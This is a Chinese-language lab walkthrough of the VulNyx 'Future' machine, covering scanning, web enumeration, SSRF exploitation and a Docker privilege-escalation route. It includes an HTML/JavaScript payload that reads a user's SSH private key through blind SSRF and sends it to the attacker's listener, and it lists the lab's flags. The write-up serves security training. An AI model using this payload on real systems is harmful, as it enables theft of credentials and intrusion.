---
title: VulNyx Future靶机复盘
author: LingMj
data: 2025-01-19
categories: [VulNyx]
tags: [upload,SSRF,docker,cewl]
description: 难度-Medium
---

## 网段扫描
```
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:df:e2:a7, IPv4: 192.168.26.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.26.1    00:50:56:c0:00:08       VMware, Inc.
192.168.26.2    00:50:56:e8:d4:e1       VMware, Inc.
192.168.26.180  00:0c:29:65:c7:65       VMware, Inc.
192.168.26.254  00:50:56:ff:4b:3d       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.298 seconds (111.40 hosts/sec). 4 responded
```

## 端口扫描

```
└─# nmap -p- -sC -sV 192.168.26.180       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-19 09:05 EST
Nmap scan report for 192.168.26.180 (192.168.26.180)
Host is up (0.0014s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 65:bb:ae:ef:71:d4:b5:c5:8f:e7:ee:dc:0b:27:46:c2 (ECDSA)
|_  256 ea:c8:da:c8:92:71:d8:8e:08:47:c0:66:e0:57:46:49 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: future.nyx
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 00:0C:29:65:C7:65 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.46 seconds
```

## 获取Webshell
>端口扫描出现域名，加一下
>

![图 0](../assets/images/237d34cfde620517b9c11cbe8878a7b21df645024fadfd0df591d387bd5dfa37.png)  

>无子域名，但是目录存在大量页面
>
![图 1](../assets/images/13d86c92bcb97aea851673fb31b31560b06a32ee2cd1b87a9966e045e500f9ed.png)  
![图 2](../assets/images/17ab7c1756fe4ce725626b6f3ea58f5dd7d472ce493abe2db27d6879d4f51ebf.png)  
![图 3](../assets/images/59c92c484e77566ecef13f6afdc5ff4e4166f3e4a8391b2953b01cb4fcad62c8.png)  
![图 4](../assets/images/dfc346cc1a61ac3964e9017f50ce1fce1341d459fadcd842133f2103e9975530.png)  
![图 5](../assets/images/f83aae9756b75a276cd44d7faada9a1519530377b7e9d491d4e72dbf2e776705.png)  

>查看图片隐写
>

```
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/lingmj/xxoo]
└─# strings -n 13 rf.png
%tEXtdate:create
2024-03-23T12:08:13+00:00
%tEXtdate:modify
2024-03-23T12:08:12+00:00
(tEXtdate:timestamp
2024-03-23T12:08:13+00:00;
|~y~~~y~~}~~]
/....7/.6/.6/7
x|||z|||x|xx|
||xxx||||z|z|Z
uy|x|8>=>=>><
'r ?6$Jwe6~14vb
WBsKaj3vw'RSS#"
)RkPs7H1baA"h
KN)NOZ5<@5}}}
|~~~y~yz~~y~z^
J{yy}}9_>mAl%b*
qcwGWs@w000DB
p>?>====<<><===
P1IFEU;* Voff
.2$3CrR`tV`Dd
S$"DT /HQ?jmk
ttsNK>=U:yL.2S
"fZJy~~~yy]R^sJ
BP1eQf)%%6#3-%
9!1 R"^S)Eo[Q
m[?a9gq#rfgh@H@fAI+`r
>}z~~~~~N)3oZk
e%Dd@34E0BdDN
uqH7'Jy~|xx||xx<>>
}}}}y}yyy}y}}}=
2Wx~wy~~~wxJ9
e-k`{6!b@J)"A
TTS=9   j.]53Nd
        '&$rnlb"f@2@
 #k'jDD`$R34%
#j!FQF"1#&Slk
33'W3t&0C#$bd
`e403&ED%C".N
D4%STi0nA4f*\&nx]
((9s(@b&>LS`&
6nL'bjufp-?7_o?
az~yV1e?|qJr9/1
ey~y~~y~y~~}y
G#$`"vvW5DsB53
e#sutG)eSWsUZ
7p0WrrwNx|zy9
10QbJ`$-zUPRB
J5"e2u\phqllo
SP#s4u%Ec3+h.ZJ
eyz~z~zzzz^sfb5
ey}]_^^^^^J)"HD
?fI9??===?=?=-
$IlL*btR)r' Q
Zk)EK1SuG       ~#m
`f0IVer&.,"Vm8>}
.hfb];CEhtY6'
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/lingmj/xxoo]
└─# stegseek rf.png     
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[!] error: the file format of the file "rf.png" is not supported.
                                                                                                                                                                                                                
┌──(root㉿LingMj)-[/home/lingmj/xxoo]
└─# exiftool rf.png
ExifTool Version Number         : 12.76
File Name                       : rf.png
Directory                       : .
File Size                       : 5.6 MB
File Modification Date/Time     : 2024:03:23 08:08:27-04:00
File Access Date/Time           : 2025:01:19 09:26:44-05:00
File Inode Change Date/Time     : 2025:01:19 09:26:37-05:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 3840
Image Height                    : 2160
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
White Point X                   : 0.3127
White Point Y                   : 0.329
Red X                           : 0.64
Red Y                           : 0.33
Green X                         : 0.3
Green Y                         : 0.6
Blue X                          : 0.15
Blue Y                          : 0.06
Background Color                : 255 255 255
Datecreate                      : 2024-03-23T12:08:13+00:00
Datemodify                      : 2024-03-23T12:08:12+00:00
Datetimestamp                   : 2024-03-23T12:08:13+00:00
Exif Byte Order                 : Big-endian (Motorola, MM)
Orientation                     : Horizontal (normal)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
Image Size                      : 3840x2160
Megapixels                      : 8.3
```

>没看出什么，继续其他目录
>

![图 6](../assets/images/3929b5dda6fa2236291968356435ef66b17de8c64e0cb6ae75895bdd11e4011b.png)  
![图 7](../assets/images/e9fdc93c8b37eb6517f1d13523f14929c1b8304e3be22a67a9d7780faf46377f.png)  
![图 8](../assets/images/bc0dd8195c838a5cc8c3ff466214fdaa4da01cd655571129877c983343f8f6ea.png)  
![图 9](../assets/images/9970f6c5dda281b8135e98cf2e341b3e77700504d010cf2df0ecbd2b39d2ab0f.png)  
![图 10](../assets/images/7a4ce4375be6fe9c8df24c37eb40ad3dc0c227f54319e67e54accf0035095c30.png)  

>找到利用点
>
![图 11](../assets/images/1e6559d401ed62046ca3dcffe5e0540d728694076f66ab365b5fcb1bed582a97.png)  
![图 12](../assets/images/5e0533c9a2c4bec49d3cc16302d89febb6ad09f8beccf72d0e88ff6fd1a7f4e7.png)  
![图 13](../assets/images/96151d8f4b42db3f4d43b460d573cb3741d5fe7d01f4577157873d3b7f15b33f.png)  
![图 14](../assets/images/f108912946f4bfd415f3b327628516e35c7be417d1d78d1b96aaa27933a8b237.png)  
![图 15](../assets/images/3057574d30f5ff991fb2efd15b7152b58c2432a4e5afce174c7ae7837288496d.png)  
![图 16](../assets/images/e555b4ca79b9ad136eea7a4ee9e65ee9da8aa579a94024178549c11d34705a03.png)  
![图 17](../assets/images/09607cf69fa333f42b16b610b15cff018bda969ba2772ffbee2e6843707c1ba7.png)  

>不懂了，但是这个page很神奇，告诉我们用户私钥位置
>
```
└─# cat cat a.html                  
<html>
    <body>
        <b>Exfiltration via Blind SSRF</b>
        <script>
        var readfile = new XMLHttpRequest(); // Read the local file
        var exfil = new XMLHttpRequest(); // Send the file to our server
        readfile.open("GET","file:///home/marty.mcfly/.ssh/id_rsa", true);
        readfile.send();
        readfile.onload = function() {
            if (readfile.readyState === 4) {
                var url = 'http://192.168.26.128:4444/?data='+btoa(this.response);
                exfil.open("GET", url, true);
                exfil.send();
            }
        }
        readfile.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
     </body>
</html>
```
![图 18](../assets/images/de74b4810a799f852dabab9c68735a9f6dbd2f286e6b7319b12016aa9c60e4aa.png)  
![图 19](../assets/images/06bfc39a2a6d66b918199421908332e35da2504131de8f0f19a60673afeb2ce5.png)  

![图 20](../assets/images/853855a830eef44cd1cce825964aa74bb26052c180ac2f56aeaf3789bcb9d36b.png)  

>牛逼，这个是真厉害，不过好像透题了，这个靶场
>

![图 21](../assets/images/a773fe00f51b7d90ef58c4420f3baf933e1617bfeb1807aae1a648b9a2ec0c9b.png)  

![图 22](../assets/images/9783dfe6bd018f6b73374c3bc39cf0a49d06aecc77edbee4bee936c2b9583161.png)  

>跑一下密码,不过大概率无果
>

![图 23](../assets/images/82d3494336deb1cd97b69df1fcfd38410851a1e2e59f14c07ef1038e043351a4.png)  

>爆破不出来，看一下思路他是html设计字典爆破
>
![图 24](../assets/images/ddcef734b8ffd5e88f237380384ec361b4586783893452bb7b3dbff76956437d.png)  
![图 25](../assets/images/17a03fec00082ae145cded939503ecfd713e837a0a2d90b2e09e60565d86e498.png)  

>这个用户名是真厉害
>
![图 26](../assets/images/f0ffa5197d96de74c6340aebd4d1f66b87c7fb13ecb4c1b8256d3cf64780a1ad.png)  

```
marty.mcfly@future:~$ sudo -l
[sudo] password for marty.mcfly: 
Sorry, try again.
[sudo] password for marty.mcfly: 
sudo: 1 incorrect password attempt
marty.mcfly@future:~$ id
uid=1000(marty.mcfly) gid=1000(marty.mcfly) groups=1000(marty.mcfly)
```

>无sudo -l
>

```
marty.mcfly@future:/home$ ls
emmett.brown  marty.mcfly
marty.mcfly@future:/home$ cd emmett.brown/
marty.mcfly@future:/home/emmett.brown$ ls -al
total 20
drwxr-xr-x 2 emmett.brown emmett.brown 4096 Mar 23  2024 .
drwxr-xr-x 4 root         root         4096 Mar 23  2024 ..
lrwxrwxrwx 1 root         root            9 Mar 23  2024 .bash_history -> /dev/null
-rw-r--r-- 1 emmett.brown emmett.brown  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 emmett.brown emmett.brown 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 emmett.brown emmett.brown  807 Apr 23  2023 .profile
marty.mcfly@future:/home/emmett.brown$ cd /opt/
marty.mcfly@future:/opt$ ls
marty.mcfly@future:/opt$ ls -al
total 8
drwxr-xr-x  2 root root 4096 Feb 12  2024 .
drwxr-xr-x 18 root root 4096 Feb 12  2024 ..
marty.mcfly@future:/opt$ cd /var/backups/
marty.mcfly@future:/var/backups$ ls -al
total 32
drwxr-xr-x  2 root root  4096 Mar 26  2024 .
drwxr-xr-x 12 root root  4096 Mar 23  2024 ..
-rw-r--r--  1 root root 11183 Mar 24  2024 apt.extended_states.0
-rw-r--r--  1 root root  1259 Mar 23  2024 apt.extended_states.1.gz
-rw-r--r--  1 root root  1203 Mar 23  2024 apt.extended_states.2.gz
-rw-r--r--  1 root root   622 Feb 12  2024 apt.extended_states.3.gz
marty.mcfly@future:/var/backups$ 
```

![图 27](../assets/images/e04770f34ea9f34920e7ccaa2e400aa6d16d7ab7e61fbf071dbe386c30634709.png)  

>没思路就跑脚本吧
>
![图 28](../assets/images/364a73d96bf4830de6e4f7d7f1d55e8d7c7f6b5c375bfc3c04f701d72215e700.png)  

![图 29](../assets/images/f8dc77de8de04ef88b350ba5cb7716b9fa1431d97fa276a6cbd4a413b96a19a2.png)  

>有docker开着
>
![图 30](../assets/images/d3bd368d7cfc730e4c67a698ce3fd4ad3b7165562f04e669462f0c6e190b37b6.png)  

![图 31](../assets/images/e3aeea872e5300cce0195c94ca537dc333454142d93bcdf8c6de79cb01bcb49b.png)  

>
>ok大概知道怎么提权了

![图 32](../assets/images/2cf030d7b0d2f782274b4f8076dcbc175eda956aaffb3278efe9c8af5b306e8e.png)  
![图 33](../assets/images/6ded6c9c865a8b6ec262f89ec92bc9642bee3a82ca7f07f7f8393e19fabadbf1.png)  

![图 34](../assets/images/2e736ba7921536f977bcbe7180a962bed2c85706a5fcca66d140f2519a82d63e.png)  
>没有image开着,难受只能去下载拉取
>
![图 35](../assets/images/77e6ab073696aef43cb6e616a4e0a594f3831c210f070493c2059f027f179997.png)  
![图 36](../assets/images/cc8604421c0c5e02d4997298213b4866bf1d5f332bbfc6b0902ddcc54e0b3a7e.png)  
>我这个能访问github，但是他拉取没有docker image的我查查，实在不行就不打了。算了查了一圈，目前来看解决不了，等过几天再处理这个问题，但至少证明是怎么干，留一下flag
>


>
>userflag:fe12df45c64c362ec68abd9c27467e35
>
>rootflag:69c965c53f43ec68d503247796604b3d











































